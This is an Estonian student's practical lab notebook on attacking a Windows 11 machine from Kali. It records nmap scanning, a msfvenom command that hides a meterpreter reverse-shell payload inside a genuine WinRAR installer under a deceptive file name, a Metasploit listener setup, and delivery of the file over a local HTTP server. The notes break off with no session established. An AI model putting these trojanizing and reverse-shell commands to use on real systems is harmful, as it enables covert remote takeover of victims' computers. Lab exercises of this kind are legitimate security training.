# ⚙️ PRAKTILINE TUND: Hack to Windows
**Autor:** ocrHeiki 
**Aeg:** 08.05.2026

## Labori ettevalmistus ja võrgukontroll

## Masinad :computer:
---
- **Kali**: `ip a` 192.168.1.101
- **Windows 11**: `ifconfig` 192.168.1.104

- **Kali**
  `ping 192.168.1.104` ei toimi midagi

## Süsteemiluure
---
- **Kali**
  `nmap -sV -p- 192.168.1.104` Starting Nmap

  Sain vastusks, et avatud on vaid Port **7680** ja see kasutab teenust **pando-pub?**, mis on seotud Windows on funktsiooniga.
  **Windows Update Delivery Optimization (WUDO)**, see on Microsoft tehnoloogia,
  mis lubab arvutitel laadida Windows uuendusi alla mitte ainult Microsoft serveritest,
  vaid ka teistelt sama võrgu arvutitelt (P2P ehk peer-to-peer põhimõttel).

## Ründefaili loomine

Laadisin win-rar.com lehelt alla **winrar-x64-722.exe** faili ja läksin terminaliga otse Downloads kausta
`cd Downloads` ja sisestasin `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=4444 -x winrar-x64-722.exe -k -f exe -o WinRAR_Setup_Free.exe`
Se käsk ei andnud tulemust, tegin sama käsu, 
kuid ilma **-k** liputa ehk `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=4444 -x winrar-x64-722.exe -f exe -o WinRAR_Setup_Free.exe`

## Kuulaja seadistamine **Kali** arvutis

- `msfconsole` käivitus **Metasploit**
- **msf >** `use exploit/multi/handler` valib universaalse mooduli sissetulevate ühenduste haldamiseks ja kuulamiseks
- **msf exploit(multi/handler) >** `set payload windows/x64/meterpreter/reverse_tcp` ütleb ründajale, millist tüüpi ründekoodi oodata.
  Se peab olema **täpselt sama, mis "msfvenomiga" genereeritud**
- **msf exploit(multi/handler) >** `set LHOST 192.168.1.101` määrab IP-aadressi mida kuulatakse.
- **msf exploit(multi/handler) >** `set LPORT 4444` määrab pordi mida kuulatakse (sama, mis msfvenomi käsus).
- **msf exploit(multi/handler) >** `run` Käivitab kuulaja. **Kali** ootab nüüd ohvrit. **Started reverse TCP handler on 192.168.1.101:4444**
- **Exploit completed, but no session was created.**
- Avasin teises Terminali Tabis **Downloads** kausta ja käivitasin seal `python3 -m http.server 80` ehk tegin sellest kaustast ajutise serveri

 **WINDOWS11** masinal ..
 lülitasin kõik tulemüürid välja ja läksin internetibrauseris **Kali** masina IP aadressi peale `http://192.168.1.101` ning laadisin sealt alla **WinRAR_Setup_Free** faili.
- Käivitan alla laetud faili, Windows ütleb et ei käivitaks, kuid ma valin **Run anyway** aga eo juhtu midagi..
- 

   
